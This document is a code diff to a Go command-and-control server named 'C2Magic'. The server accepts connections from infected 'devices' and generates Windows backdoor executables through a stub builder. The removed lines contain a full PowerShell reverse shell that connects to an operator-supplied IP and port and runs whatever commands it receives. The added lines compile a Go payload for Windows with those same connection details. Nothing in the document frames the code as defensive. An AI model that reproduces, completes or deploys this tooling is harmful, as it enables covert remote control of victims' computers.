@@ -9,6 +9,7 @@ import (
 	"strings"
 	"sync"
 	"time"
+	"path/filepath"
 
 	"github.com/fatih/color"
 )
@@ -28,7 +29,7 @@ func main() {
 
 	port := os.Args[1]
 	fmt.Println("\n2024 blackmagic baby <3")
-	fmt.Println("Starting C2Magic on port", port)
+	fmt.Println("\n")
 
 	// Start the TCP listener on the specified port
 	listener, err := net.Listen("tcp", ":"+port)
@@ -57,7 +58,7 @@ func main() {
 		deviceCounter++
 		mu.Unlock()
 
-		fmt.Printf("New connection from %s assigned ID: %d\n", conn.RemoteAddr().String(), deviceID)
+		fmt.Printf("\nNew connection from %s assigned ID: %d\n", conn.RemoteAddr().String(), deviceID)
 
 		go handleConnection(conn, deviceID)
 	}
@@ -71,7 +72,7 @@ func handleConnection(conn net.Conn, deviceID int) {
 		delete(connections, deviceID)
 		delete(deviceOutputChannels, deviceID) // Clean up output channel
 		mu.Unlock()
-		fmt.Println("Connection closed for device ID:", deviceID)
+		fmt.Println("\nConnection closed for device ID:", deviceID)
 	}()
 
 	reader := bufio.NewReader(conn)
@@ -144,7 +145,7 @@ func CreateStub() {
 	fmt.Scanln(&ip)
 	fmt.Print("Enter port for client to connect to: ")
 	fmt.Scanln(&port)
-	fmt.Print("Enter file name for the executable (e.g., client.exe): ")
+	fmt.Print("Enter file name for the executable (client.exe): ")
 	fmt.Scanln(&fileName)
 	fmt.Print("Enter output directory: ")
 	fmt.Scanln(&outputDir)
@@ -154,74 +155,43 @@ func CreateStub() {
 		outputDir = "."
 	}
 
-	// PowerShell script template, with user-defined IP and port
-	powershellScript := fmt.Sprintf(`Set-Variable -Name client -Value (Set-Variable -Name stream -Value (Set-Variable -Name buffer -Value (Set-Variable -Name writer -Value (Set-Variable -Name data -Value (Set-Variable -Name result -Value ($null))))));
-try {
-	Set-Variable -Name client -Value (New-Object Net.Sockets.TcpClient("%s", %s));
-	Set-Variable -Name stream -Value ($client.GetStream());
-	Set-Variable -Name buffer -Value (New-Object Byte[] 1024);
-	Set-Variable -Name encoding -Value (New-Object Text.UTF8Encoding);
-	Set-Variable -Name writer -Value (New-Object IO.StreamWriter($stream, [Text.Encoding]::UTF8, 1024));
-	$writer.AutoFlush = $true;
-	Write-Host "Running...";
-	Write-Host"";
-	Set-Variable -Name bytes -Value (0);
-	do {
-		$writer.Write("PS>");
-		do {
-			Set-Variable -Name bytes -Value ($stream.Read($buffer, 0, $buffer.Length));
-			if ($bytes -gt 0) {
-				$data += $encoding.GetString($buffer, 0, $bytes);
-			}
-		} while ($stream.DataAvailable);
-		if ($bytes -gt 0) {
-			$data = $data.Trim();
-			if ($data.Length -gt 0) {
-				try {
-					$result = Invoke-Expression -Command $data 2>&1 | Out-String;
-				} catch {
-					$result = $_.Exception | Out-String;
-				}
-				Clear-Variable data;
-				if ($result.Length -gt 0) {
-					$writer.Write($result);
-					Clear-Variable result;
-				}
-			}
-		}
-	} while ($bytes -gt 0);
-	Write-Host "Backdoor will now exit...";
-} catch {
-	Write-Host $_.Exception.InnerException.Message;
-} finally {
-	if ($writer -ne $null) { $writer.Close(); $writer.Dispose(); Clear-Variable writer; }
-	if ($stream -ne $null) { $stream.Close(); $stream.Dispose(); Clear-Variable stream; }
-	if ($client -ne $null) { $client.Close(); $client.Dispose(); Clear-Variable client; }
-	if ($buffer -ne $null) { $buffer.Clear(); Clear-Variable buffer; }
-	if ($result -ne $null) { Clear-Variable result; }
-	if ($data -ne $null) { Clear-Variable data; }
-	[GC]::Collect();
-}`, ip, port)
+	// Define paths
+	currentDir, _ := os.Getwd()
+	payloadPath := filepath.Join(currentDir, "Dependencies", "payload1.go")
 
-	// Create a temporary file to hold the PowerShell script
-	tempFile, err := os.CreateTemp("", "temp_script_*.ps1")
+	// Read and modify the payload file
+	payloadContent, err := os.ReadFile(payloadPath)
 	if err != nil {
-		fmt.Println("Error creating temporary script file:", err)
+		fmt.Println("Error reading payload file:", err)
+		return
+	}
+
+	// Replace placeholders with user input
+	modifiedContent := fmt.Sprintf(string(payloadContent), ip, port)
+
+	// Create a temporary file to save the modified Go code
+	tempFile, err := os.CreateTemp("", "temp_payload_*.go")
+	if err != nil {
+		fmt.Println("Error creating temporary file:", err)
 		return
 	}
 	defer os.Remove(tempFile.Name()) // Ensure temp file is removed after execution
 
-	// Write the PowerShell script to the temp file
-	_, err = tempFile.WriteString(powershellScript)
+	// Write modified content to the temporary file
+	writer := bufio.NewWriter(tempFile)
+	_, err = writer.WriteString(modifiedContent)
 	if err != nil {
-		fmt.Println("Error writing to temporary script file:", err)
+		fmt.Println("Error writing to temporary file:", err)
 		return
 	}
+	writer.Flush()
 	tempFile.Close()
 
-	// Compile the PowerShell script to an executable with mingw-w64
-	outputPath := fmt.Sprintf("%s/%s", outputDir, fileName)
-	cmd := exec.Command("x86_64-w64-mingw32-gcc", "-o", outputPath, tempFile.Name())
+	// Compile the modified Go code for Windows
+	outputPath := filepath.Join(outputDir, fileName)
+	cmd := exec.Command("go", "build", "-o", outputPath, tempFile.Name())
+	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
+
 	output, err := cmd.CombinedOutput()
 	if err != nil {
 		fmt.Printf("Compilation failed: %s\n", output)
